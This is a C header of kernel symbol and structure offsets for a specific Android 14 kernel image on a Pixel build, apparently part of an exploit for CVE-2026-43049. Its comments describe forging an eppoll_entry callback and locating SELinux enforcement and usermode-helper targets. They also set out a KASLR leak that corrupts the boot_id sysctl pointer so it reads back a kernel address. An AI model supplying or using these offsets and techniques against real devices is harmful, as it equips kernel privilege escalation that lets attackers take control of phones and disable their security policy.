/* android14-6.1-ab14691759 -- offsets into one kernel image, shared by every build that ships it.
 *
 * Named for the banner that identifies the image, which is the thing these
 * are offsets into:
 *
 *   Linux version 6.1.145-android14-11-gfa1d6308d1fe-ab14691759
 *
 * Shipped by 1 of the device-builds in data/targets.json, whose Images are
 * byte-identical (md5 3e88a648271d):
 *
 *   bluejay-CP1A.260405.005
 *
 * A symbol offset is a fact about an image, not about a phone, which is why it
 * is stated once here rather than per device: one image, one set of values, one
 * place to correct them.
 *
 * Derived by tools/pixel-image/derive_offsets.py from the image itself; the
 * same command re-derives them, and --compare checks a committed header
 * against the image it claims to describe.
 */
#ifndef ANDROID14_6_1_AB14691759_H
#define ANDROID14_6_1_AB14691759_H

/* the wake callback a forged eppoll_entry names as its .func */
#ifndef EP_POLL_CALLBACK_OFF
#define EP_POLL_CALLBACK_OFF        0x00402640ULL
#endif
/* the version string, as a read target that identifies itself */
#ifndef LINUX_BANNER_OFF
#define LINUX_BANNER_OFF            0x012cbe20ULL
#endif
/* every registered input_dev is on this list, so a leaked one is findable by name */
#ifndef INPUT_DEV_LIST_OFF
#define INPUT_DEV_LIST_OFF          0x0214c790ULL
#endif

// ── Kernel release ──
// Encoded as (major<<16)|(minor<<8)|min(patch,255) so a stage can refuse at
// build time a vehicle whose structure only exists from a given release,
// instead of discovering it on the device.
#define KERNEL_VERSION_CODE               0x060191  // 6.1.145
// ── Symbol offsets from the image base ──
#define ASHMEM_IOCTL_OFF                  0x00c322c8ULL
#define ASHMEM_MMAP_OFF                   0x00c32c58ULL
#define ASHMEM_OPEN_OFF                   0x00c32e78ULL
#define ASHMEM_RELEASE_OFF                0x00c32f00ULL
#define ASHMEM_SHOW_FDINFO_OFF            0x00c33020ULL
// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(miscdevice, fops=0x10)
#define ASHMEM_MISC_FOPS_OFF              0x0216c080ULL
#define ASHMEM_FOPS_OFF                   0x0127fe88ULL
#define ASHMEM_COMPAT_IOCTL_OFF           0x00c32c00ULL
#define CONFIGFS_READ_ITER_OFF            0x004637e0ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF       0x00463d10ULL
// 6.1 has no copy_splice_read: configfs uses generic_file_splice_read
#define COPY_SPLICE_READ_OFF              0x003e57c0ULL
#define NOOP_LLSEEK_OFF                   0x00397fc0ULL
#define INIT_TASK_OFF                     0x0200f600ULL
#define ROOT_TASK_GROUP_OFF               0x021f7580ULL
// runtime selinux_enforcing = selinux_state.enforcing = selinux_state + 0
#define SELINUX_ENFORCING_OFF             0x02249400ULL
#define SELINUX_BLOB_SIZES_OFF            0x015cc608ULL
#define SECURITY_HOOK_HEADS_OFF           0x015cbef8ULL
#define KMALLOC_CACHES_OFF                0x015cba38ULL
#define ANON_PIPE_BUF_OPS_OFF             0x011091d0ULL
// CVE-2026-43049 (FFWheel). Derived from this build's own Image by
// tools/pixel-image/derive_offsets.py; re-derive with the same command.
// the wake callback a forged eppoll_entry names as its .func
#define EP_POLL_CALLBACK_OFF              0x00402640ULL
// the version string, as a read target that identifies itself
#define LINUX_BANNER_OFF                  0x012cbe20ULL
// every registered input_dev is on this list, so a leaked one is findable by name
#define INPUT_DEV_LIST_OFF                0x0214c790ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d3680ULL
#define SYSTEM_UNBOUND_WQ_OFF             0x01ffae60ULL
// ── Slide references ──
// Symbols a text-base recovery reads or reaches through.
// nfulnl_logger struct (registered via nf_log_register(NFPROTO_UNSPEC,...)).
#define SLIDE_NFULNL_LOGGER_OFF           0x020029c8
#define SLIDE_TRACE_MARK_IP_OFF           0x001f06fcULL
// loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8  (holds &nfulnl_logger)
#define SLIDE_LOGGERS_0_1_OFF             0x02002918ULL
// 6.1 serves /proc/sys/kernel/random/boot_id from sysctl_bootid[16]
// (drivers/char/random.c: ctl_table .data = &sysctl_bootid). No separate
// random_boot_id exists on 6.1.
//
// The slide write must corrupt random_table[4].data (the .data pointer of
// the boot_id ctl_table entry), NOT sysctl_bootid itself. proc_do_uuid()
// then treats the corrupted pointer as the buffer address and reads 16
// bytes from there (the contents of loggers[0][1] = &nfulnl_logger).
// random_table @ 0x21273c0; entry idx4 (boot_id) * 0x40 + data@0x8 = 0x21274c8.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF     0x021274c8ULL
// sysctl_bootid buffer itself (restore_slide_boot_id writes &sysctl_bootid
// back into random_table[4].data via SLIDE_SYSCTL_BOOTID).
#define SLIDE_SYSCTL_BOOTID_OFF           0x0226a498ULL
// 6.1 slide uses loggers[0][1] (= SLIDE_LOGGERS_0_1) as the rb parent
// whose content is leaked.
#define SLIDE_LOGGER_PARENT               SLIDE_LOGGERS_0_1
#define MM_OWNER_OFF                      0x338
#define WAITER_LOCAL_OFF                  0x80
#define WAITER_TREE_ENTRY_OFF             0x00
#define WAITER_PI_TREE_ENTRY_OFF          0x18
#define WAITER_TASK_OFF                   0x30
#define WAITER_LOCK_OFF                   0x38
#define WAITER_WAKE_STATE_OFF             0x40
#define WAITER_PRIO_OFF                   0x44
#define WAITER_DEADLINE_OFF               0x48
#define WAITER_WW_CTX_OFF                 0x50
#define FOPS_POST_LLSEEK_OFF              0x10

#endif /* ANDROID14_6_1_AB14691759_H */
